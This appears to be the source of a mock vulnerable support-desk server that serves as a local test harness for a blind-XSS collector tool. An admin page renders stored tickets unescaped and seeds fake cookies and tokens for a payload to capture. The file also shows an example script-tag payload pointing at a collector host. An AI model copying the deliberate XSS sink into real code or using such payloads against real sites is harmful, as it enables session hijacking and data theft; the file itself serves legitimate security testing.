// blind-xss-collector — MANUAL TEST APP (mock vulnerable support desk).
// Pure Node, no deps. Simulates a stored-XSS blind-XSS flow you can drive by hand
// in a real browser to confirm your collector works end to end.
//
//   Attacker side  GET  /            submit a "support ticket" (paste your payload here)
//   Victim side    GET  /admin       staff panel that renders stored tickets UNESCAPED
//                                     (the sink) + sets a fake admin cookie / localStorage /
//                                     CSRF token so the callback capture has real data.
//                  GET  /admin?csp=1  same, but under a strict CSP (connect-src 'self') to
//                                     exercise the probe's img-src image-beacon fallback.
//   Protected      GET  /admin/secret returns secret data ONLY if the admin cookie rides along
//                                     — the target for an interactive `fetch:/admin/secret`.
//   Reset          POST /reset        clear stored tickets.
//
// Run:   node demo/server.mjs        (or: npm run demo)   → http://127.0.0.1:8080
// Port:  PORT=9000 node demo/server.mjs
import http from 'node:http';

const PORT = +(process.env.PORT || 8080);
const tickets = [];   // {id, subject, body}  body is rendered UNESCAPED on /admin (the vuln)

const page = (title, inner) => `<!doctype html><html><head><meta charset=utf-8>
<title>${title}</title><meta name=viewport content="width=device-width,initial-scale=1">
<style>
 body{font:15px/1.6 system-ui,Segoe UI,Arial,sans-serif;max-width:820px;margin:32px auto;padding:0 18px;color:#1a1a1a;background:#fafafa}
 h1{font-size:20px} h2{font-size:15px;color:#555;margin-top:26px}
 .box{background:#fff;border:1px solid #e2e2e2;border-radius:10px;padding:16px 18px;margin:14px 0}
 label{display:block;font-size:13px;color:#666;margin:10px 0 4px}
 input,textarea{width:100%;box-sizing:border-box;font:inherit;padding:8px 10px;border:1px solid #ccc;border-radius:7px}
 textarea{min-height:90px;font-family:ui-monospace,Menlo,monospace;font-size:13px}
 button{font:inherit;font-weight:600;background:#2563eb;color:#fff;border:0;border-radius:7px;padding:9px 18px;cursor:pointer;margin-top:12px}
 button.g{background:#6b7280} a{color:#2563eb}
 .tk{border-top:1px solid #eee;padding:12px 0} .tk:first-child{border-top:0}
 .tk .subj{font-weight:600} .muted{color:#888;font-size:13px}
 code{background:#f0f0f3;padding:1px 5px;border-radius:4px;font-size:13px}
 .warn{background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;border-radius:8px;padding:10px 12px;font-size:13px}
</style></head><body>${inner}</body></html>`;

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://' + (req.headers.host || '127.0.0.1'));
  const send = (code, type, body, extra) => { res.writeHead(code, { 'Content-Type': type, ...(extra || {}) }); res.end(body); };

  // ---------- attacker side: submit a ticket ----------
  if (url.pathname === '/' && req.method === 'GET') {
    const list = tickets.length
      ? tickets.map(t => `<div class=tk><div class=subj>#${t.id} · ${escapeHtml(t.subject)}</div><div class=muted>stored — will render unescaped in the staff panel</div></div>`).join('')
      : '<div class=muted>no tickets yet</div>';
    return send(200, 'text/html', page('Support — new ticket', `
<h1>📮 Acme Support — submit a ticket <span class=muted>(attacker side)</span></h1>
<div class=warn><b>Manual blind-XSS test.</b> Generate a payload in your collector dashboard's
<b>Payload Generator</b> tab (host = your <code>wrangler dev</code> origin like
<code>127.0.0.1:8787</code>, or your deployed worker host), then paste it into <b>message</b> below and
submit. Then open the <a href="/admin" target=_blank>staff panel (/admin)</a> in another tab to play the
admin — the stored payload renders there and your probe fires.</div>
<div class=box><form method=POST action=/submit>
  <label>your name / subject</label><input name=subject value="Payment issue" required>
  <label>message (paste the generated payload here — rendered unescaped by the staff panel)</label>
  <textarea name=body required placeholder='"&gt;&lt;script src=//127.0.0.1:8787/c/t-demo-xxxx&gt;&lt;/script&gt;'></textarea>
  <button>Submit ticket</button>
</form></div>
<h2>stored tickets</h2><div class=box>${list}</div>
<form method=POST action=/reset><button class=g>Reset (clear tickets)</button></form>
<p class=muted>Endpoints: <code>/admin</code> · <code>/admin?csp=1</code> (beacon fallback) ·
<code>/admin/secret</code> (needs admin cookie — target for <code>fetch:/admin/secret</code>)</p>`));
  }

  if (url.pathname === '/submit' && req.method === 'POST') {
    const form = new URLSearchParams(await readBody(req));
    tickets.push({ id: tickets.length + 1, subject: form.get('subject') || '', body: form.get('body') || '' });
    return send(303, 'text/html', '', { Location: '/' });
  }
  if (url.pathname === '/reset' && req.method === 'POST') {
    tickets.length = 0;
    return send(303, 'text/html', '', { Location: '/' });
  }

  // ---------- victim side: staff panel that renders stored bodies UNESCAPED ----------
  if (url.pathname === '/admin' && req.method === 'GET') {
    const strict = url.searchParams.get('csp') === '1';
    const rows = tickets.length
      ? tickets.map(t => `<div class=tk><div class=subj>Ticket #${t.id} — ${escapeHtml(t.subject)}</div>
        <div class=body>${t.body}</div></div>`).join('')          // <-- t.body UNESCAPED = the stored-XSS sink
      : '<div class=muted>no tickets — submit one on the attacker side first</div>';
    const headers = { 'Content-Type': 'text/html',
      'Set-Cookie': 'adminsess=SECRET-ADMIN-COOKIE-42; path=/' };
    if (strict) {
      // allow the probe script + images to the collector, but block fetch/sendBeacon
      // (connect-src 'self') so the probe must fall back to the img-src image-beacon.
      const host = collectorHost() || '*';
      headers['Content-Security-Policy'] =
        `default-src 'self'; script-src 'self' http://${host} https://${host} 'unsafe-inline'; img-src *; connect-src 'self'`;
    }
    return send(200, 'text/html', page('Acme Staff — ticket queue', `
<script>
  // fake authenticated staff context so the capture has real secrets to grab
  try{ localStorage.setItem('jwt','eyJADMIN.demo.token'); sessionStorage.setItem('role','superadmin'); }catch(e){}
</script>
<meta name=csrf-token content="CSRF-DEMO-TOKEN-9f8e">
<form style=display:none><input type=hidden name=csrf value="HIDDEN-CSRF-abcdef"></form>
<h1>🛡️ Acme Staff — ticket queue <span class=muted>(victim / admin side${strict ? ' · strict CSP' : ''})</span></h1>
<div class=warn>You are now "the admin". Any stored payload below has just executed in this
authenticated page — check your collector's <b>Sessions</b> tab for the callback.</div>
<div class=box>${rows}</div>
<p class=muted><a href="/">← attacker side</a> · secret data lives at
<a href="/admin/secret">/admin/secret</a> (only readable with this page's cookie)</p>`), headers);
  }

  // ---------- protected endpoint: the fetch-as-victim target ----------
  if (url.pathname === '/admin/secret' && req.method === 'GET') {
    const authed = (req.headers.cookie || '').includes('adminsess=SECRET-ADMIN-COOKIE-42');
    return send(authed ? 200 : 403, 'text/plain',
      authed ? 'TOP-SECRET: full customer export — 48,213 rows, all PII. (proves fetch-as-victim)' : 'forbidden — admin cookie required');
  }

  send(404, 'text/plain', 'not found');
});

function readBody(req) { return new Promise(r => { let b = ''; req.on('data', c => b += c); req.on('end', () => r(b)); }); }
function escapeHtml(s) { return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])); }
// derive the collector host from a stored payload so the strict-CSP variant can allow its script
function collectorHost() {
  for (const t of tickets) {
    const m = (t.body || '').match(/\/\/([^\/'"\s>)]+)\/[cp]\//);
    if (m) return m[1];
  }
  return null;
}

server.listen(PORT, () => {
  console.log(`\n  blind-xss-collector manual test app`);
  console.log(`  attacker side : http://127.0.0.1:${PORT}/`);
  console.log(`  staff panel   : http://127.0.0.1:${PORT}/admin        (probe fires here)`);
  console.log(`  strict CSP    : http://127.0.0.1:${PORT}/admin?csp=1   (image-beacon fallback)`);
  console.log(`  secret target : http://127.0.0.1:${PORT}/admin/secret  (fetch-as-victim)\n`);
});
